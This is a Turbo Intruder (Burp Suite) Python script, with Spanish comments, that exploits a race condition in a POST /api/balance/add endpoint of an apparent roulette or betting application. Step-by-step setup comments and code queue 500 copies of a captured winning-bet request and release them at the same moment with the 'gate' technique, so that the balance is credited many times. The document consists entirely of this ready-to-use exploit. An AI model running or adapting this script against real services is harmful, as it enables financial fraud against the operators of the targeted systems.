# Turbo Intruder script for exploiting race condition in POST /api/balance/add
#
# SETUP:
# 1. En la ruleta, haz una apuesta y GANA
# 2. Captura la request POST /api/balance/add en Burp Proxy
# 3. Click derecho → Extensions → Turbo Intruder → Send to turbo intruder
# 4. Reemplaza el script con este archivo
# 5. Click "Attack"
#
# IMPORTANT: Este script usa la técnica "gate" para sincronizar todas las requests
# y lanzarlas EXACTAMENTE al mismo tiempo para maximizar la race condition

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=100,  # 100 conexiones concurrentes
                          requestsPerConnection=100,  # 100 requests por conexión = 10,000 total
                          pipeline=False,             # No pipeline - cada request en su propia conexión
                          maxRetriesPerRequest=0,
                          timeout=10
                          )

    # GATE TECHNIQUE: Todas las requests se encolan primero, luego se lanzan simultáneamente
    # Esto maximiza la probabilidad de explotar la race condition

    # Número de requests a enviar
    NUM_REQUESTS = 500

    # Encolar todas las requests (no se envían aún)
    for i in range(NUM_REQUESTS):
        engine.queue(target.req, gate=str(1))  # gate=1 agrupa todas las requests

    # Abrir el gate - TODAS las requests se lanzan SIMULTÁNEAMENTE
    engine.openGate(str(1))


def handleResponse(req, interesting):
    # Callback cuando llega una respuesta
    # Muestra solo las exitosas (200)
    if req.status == 200:
        table.add(req)
